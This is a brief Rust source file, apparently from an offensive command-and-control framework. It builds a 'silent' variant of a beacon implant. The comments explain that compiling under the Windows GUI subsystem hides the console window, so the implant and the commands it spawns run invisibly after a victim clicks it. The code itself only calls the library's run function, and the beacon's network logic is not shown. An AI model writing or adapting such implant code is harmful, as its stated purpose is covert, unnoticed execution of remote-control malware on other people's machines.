//! ruststrike-beacon-cycle-silent: GUI-subsystem short-cycle beacon implant.
//!
//! Identical to `ruststrike-beacon-cycle` (same lib, same loader, same
//! short-cycle reconnect loop) but built with the **Windows GUI subsystem** —
//! so launching it does NOT allocate a console window. Combined with the
//! command-exec BOFs already spawning their children with `CREATE_NO_WINDOW`,
//! the whole agent runs silently in the background: "click to run" produces no
//! visible cmd window.
//!
//! `#![windows_subsystem = "windows"]` is the only difference from the console
//! bin. It must be the first item in the crate root.

#![windows_subsystem = "windows"]

fn main() -> anyhow::Result<()> {
    ruststrike_beacon_cycle::run()
}
